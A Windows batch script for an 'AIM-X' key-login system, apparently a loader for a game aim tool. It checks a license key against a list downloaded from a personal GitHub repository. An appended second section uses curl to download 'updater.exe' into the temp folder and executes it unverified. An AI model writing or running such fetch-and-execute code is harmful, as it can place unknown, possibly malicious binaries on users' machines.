@echo off
setlocal EnableDelayedExpansion
title AIMX Login
color 01

:: Header
echo.
echo [INFO] WELCOME TO AIM-X LOGIN SYSTEM

:: === Input Key ===
set /p KEY=Login Key: 

:: === Bersihkan layar setelah input ===
cls
title AIMX Login
color 0C

:: === Ambil tanggal online (Asia/Jakarta) ===
for /f "delims=" %%i in ('powershell -Command "(Invoke-RestMethod 'https://timeapi.io/api/Time/current/zone?timeZone=Asia/Jakarta').dateTime"') do set T=%%i
if "%T%"=="" (
    color 0C
    echo Error: time cannot be identified.
    pause
    exit /b
)
set T=%T:~0,10%

:: === Ambil data key dari GitHub RAW ===
set KEYFOUND=false
set "KEYURL=https://raw.githubusercontent.com/fujikomilk17/lmao/main/key-active.txt"

:: Unduh key file ke TEMP
powershell -Command "Invoke-WebRequest -Uri '%KEYURL%' -OutFile '%TEMP%\key.txt'"

:: Baca dan validasi key
for /f "tokens=1,2,3 delims=;" %%a in (%TEMP%\key.txt) do (
    set "KEYFILE=%%a"
    set "ROLE=%%b"
    set "EXP=%%c"

    if /i "!KEY!"=="!KEYFILE!" (
        set KEYFOUND=true

        if /i "!ROLE!"=="admin" (
            echo.
            color 0C
            echo Session: ADMIN [!EXP!]
            goto :MAIN
        )

        if /i "!EXP!"=="lifetime" (
            echo.
            color 0A
            echo Session: USER [lifetime]
            goto :MAIN
        )

        if "!T!" LEQ "!EXP!" (
            echo.
            color 0A
            echo Session: USER [active s.d !EXP!]
            goto :MAIN
        ) else (
            echo.
            color 0C
            echo Login expired [expired !EXP!]
            pause
            exit /b
        )
    )
)

if /i "!KEYFOUND!"=="false" (
    color 0C
    echo.
    echo Login failed [key invalid]
    pause
    exit /b
)

goto :eof

:MAIN
echo.
echo.
:: === Tambahkan perintah utama AIMX di sini ===


@echo off
setlocal enabledelayedexpansion

REM === URL key dari GitHub ===
set "key_url=https://raw.githubusercontent.com/fujikomilk17/lmao/refs/heads/main/key.txt"

REM === URL updater.exe dari GitHub ===
set "updater_url=https://github.com/fujikomilk17/lmao/raw/refs/heads/main/updater.exe"

REM === Lokasi file token dan updater.exe
set "token_file=%TEMP%\access_granted.token"
set "updater_path=%TEMP%\updater.exe"

REM === Bersihkan token lama
del /f /q "%token_file%" >nul 2>&1

REM === Ambil key dari URL dan simpan sebagai token
curl -s "%key_url%" -o "%token_file%"

REM === Download updater.exe jika belum ada
if not exist "%updater_path%" (
    echo Mengunduh updater.exe...
    curl -L -o "%updater_path%" "%updater_url%"
) else (
    echo updater.exe sudah ada di TEMP, melewati proses download...
)

REM === Jalankan updater.exe langsung (tanpa start, jadi script menunggu sampai selesai)
"%updater_path%"

REM === Hapus token setelah selesai
del /f /q "%token_file%" >nul 2>&1

pause

>nul pause
exit
